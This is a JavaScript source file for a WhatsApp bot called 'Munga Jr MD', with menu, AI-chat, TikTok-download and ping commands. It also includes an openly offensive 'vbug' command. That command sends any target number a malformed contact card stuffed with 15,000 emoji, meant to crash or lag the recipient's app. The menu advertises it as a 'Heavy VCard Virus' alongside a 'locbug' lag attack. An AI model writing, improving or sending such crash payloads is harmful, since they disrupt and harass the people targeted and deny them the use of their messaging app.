const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const { Boom } = require('@hapi/boom');
const qrcode = require('qrcode-terminal');
const axios = require('axios');

const prefix = "."; 
const ownerNumber = ["255763071896@s.whatsapp.net"]; // CHANGE THIS TO YOUR NUMBER

async function startMungaJrMD() {
    const { state, saveCreds } = await useMultiFileAuthState('MungaSession');
    const sock = makeWASocket({
        version: (await fetchLatestBaileysVersion()).version,
        auth: state,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: true,
        browser: ['Munga Jr MD', 'Chrome', '3.0.0']
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr) qrcode.generate(qr, { small: true });
        if (connection === 'open') console.log('\n--- MUNGA JR MD IS LIVE ---');
    });

    sock.ev.on('messages.upsert', async m => {
        const msg = m.messages[0];
        if (!msg.message || msg.key.fromMe) return;

        const from = msg.key.remoteJid;
        const type = Object.keys(msg.message)[0];
        const body = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : (type === 'imageMessage') ? msg.message.imageMessage.caption : '';
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);
        const text = args.join(" ");
        const sender = msg.key.participant || msg.key.remoteJid;

        // --- FANCY MENU UI ---
        if (command === 'menu' || command === 'help') {
            const neonImage = "https://telegra.ph/file/5a5a1f26a11e1f14300e8.jpg"; 
            let menuText = `
╔════════════════════╗
║    ⚡ **MUNGA-JR-MD** ⚡
╚════════════════════╝
👤 **USER:** @${sender.split('@')[0]}
🛠️ **CREATOR:** Mark Richard
🔑 **PREFIX:** ${prefix}
╰════════════════════╝

*『 BUG & CRASH 』☠️*
☠️ ${prefix}vbug (Number) - Heavy VCard Virus
🌀 ${prefix}locbug (Number) - Location Lag

*『 DOWNLOADER 』📥*
📹 ${prefix}tiktok (Link) - Download TikTok
🎵 ${prefix}ytmp3 (Link) - YouTube Music

*『 AI & UTILS 』🤖*
🧠 ${prefix}ai (Question) - ChatGPT
🚀 ${prefix}ping - Check Speed
👤 ${prefix}owner - Contact Dev

> 💻 Engineered by Munga Tech`;

            await sock.sendMessage(from, { image: { url: neonImage }, caption: menuText, mentions: [sender] });
        }

        // --- API COMMAND LOGIC ---
        switch (command) {
            case 'ai':
                if (!text) return sock.sendMessage(from, { text: "Please ask a question!" });
                try {
                    const res = await axios.get(`https://api.simsimi.net/v2/?text=${encodeURIComponent(text)}&lc=en`);
                    await sock.sendMessage(from, { text: `🤖 *Munga AI:* ${res.data.success}` });
                } catch (e) {
                    await sock.sendMessage(from, { text: "❌ AI Server is busy." });
                }
                break;

            case 'tiktok':
                if (!text) return sock.sendMessage(from, { text: "Send a TikTok link!" });
                try {
                    await sock.sendMessage(from, { text: "📥 Downloading TikTok video..." });
                    const ttRes = await axios.get(`https://api.tiklydown.eu.org/api/download?url=${text}`);
                    await sock.sendMessage(from, { video: { url: ttRes.data.data.video.noWatermark }, caption: "Done! ✅" });
                } catch (e) {
                    await sock.sendMessage(from, { text: "❌ Error downloading video." });
                }
                break;

            case 'vbug':
                if (!text) return sock.sendMessage(from, { text: "Provide target number!" });
                const vtarget = text + '@s.whatsapp.net';
                const vcard = 'BEGIN:VCARD\nVERSION:3.0\nFN:Munga Virus ☠️\nitem1.ADR:;;' + "🔥".repeat(15000) + ';;;;\nEND:VCARD';
                await sock.sendMessage(vtarget, { contacts: { displayName: 'Munga Jr Payload', contacts: [{ vcard }] } });
                await sock.sendMessage(from, { text: `✅ Attack sent to @${text}!`, mentions: [vtarget] });
                break;

            case 'ping':
                await sock.sendMessage(from, { text: `🚀 *Response:* ${Date.now() - msg.messageTimestamp * 1000} ms` });
                break;
        }
    });
}
startMungaJrMD();
